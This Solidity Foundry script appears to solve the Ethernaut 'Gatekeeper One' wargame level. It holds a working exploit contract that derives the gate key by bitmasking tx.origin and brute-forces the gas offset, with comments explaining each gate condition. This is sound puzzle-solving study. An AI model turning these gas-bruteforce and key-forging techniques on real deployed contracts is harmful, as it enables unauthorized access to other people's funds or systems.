// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../src/GatekeeperOne.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "forge-std/StdStorage.sol";

contract Pwner {
    event Log(string message);
    event LogBytes(bytes data);

    GatekeeperOne public instance = GatekeeperOne(0xF04F66Ac78896BDD301A91623695b6B0865992A5);

    // function start(bytes8 key, uint256 gas) public {
    //     require(gas < 8191, "gas is too high");
    //     try instance.enter{gas: gas + 8191 * 10}(key) returns (bool) {
    //         emit Log("success");
    //     } catch (bytes memory reason) {
    //         emit LogBytes(reason);
    //     }
    // }

    // Gate Three
    // Input is?
    // 8 byte string like: 0x B1 B2 B3 B4 B5 B6 B7 B8
    // 1byte = 8 bits

    // requirements #1:
    // uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
    // uint64(gateKey) -> changing it to numerical representation of gateKey
    // uint64(gateKey) ->0x B1 B2 B3 B4 B5 B6 B7 B8

    // uint32(uint64(gateKey)) ->0x B5 B6 B7 B8
    // deleting part of the key itself
    // uint16(uint64(gateKey)) ->0x B7 B8
    // to make this happen, the B5 and B6 must be 0
    // to clear requirement #1, B5 and B6 must be 0

    // requirements #2:
    // `uint32(uint64(_gateKey)) != uint64(_gateKey)`
    // uint64(gateKey) ->0x B1 B2 B3 B4 B5 B6 B7 B8
    // uint32(uint64(gateKey)) ->0x B5 B6 B7 B8
    // uint32(uint64(gateKey)) != uint64(gateKey) ->0x B1 B2 B3 B4 are not equal to 0

    // requirements #3:
    // `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`
    // LHS => uint32(uint64(gateKey)) ->0x B5 B6 B7 B8
    // RHS => uint16(uint160(tx.origin)) ->0x B7 B8
    // uint160 is the same as ETH address length here
    // uint160(tx.origiin) is the numerical representation of the address
    // then B7 and B8 must be the same as the last 2 bytes of the tx.origin address

    // all in all
    // req #1: B5 and B6 must be 0
    // req #2: B1 B2 B3 B4 must not be 0
    // req #3: B7 and B8 must be the same as the last 2 bytes of the tx.origin address

    // BitMasking
    // bitwise and operator:1 & 0 => 0, 1 & 1 => 1, 0 & 0 => 0

    function pwn() external {
        // uint16 k16 = uint16(uint160(tx.origin));
        // uint64 k64 = uint64(1 << 63) + uint64(k16);
        // bytes8 key = bytes8(k64);
        // start(key, 256);
        // F in hex is 1111 in binary
        // 0xFF = 1111 1111
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);

        // start(key, 256);
        for (uint256 i; i < 300; ++i) {
            uint256 totalGas = i + (8191 * 3);
            // bool res = instance.enter{gas: totalGas}(gateKey);
            (bool res,) = address(instance).call{gas: totalGas}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (res) {
                break;
            }
        }
    }
}

contract Level13GatekeeperOneSolution is Script {
    using stdStorage for StdStorage;

    bytes32 public key;

    GatekeeperOne public instance = GatekeeperOne(0xF04F66Ac78896BDD301A91623695b6B0865992A5);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Pwner pwner = new Pwner();
        pwner.pwn();

        console.log("address: ", instance.entrant());

        vm.stopBroadcast();
    }
}
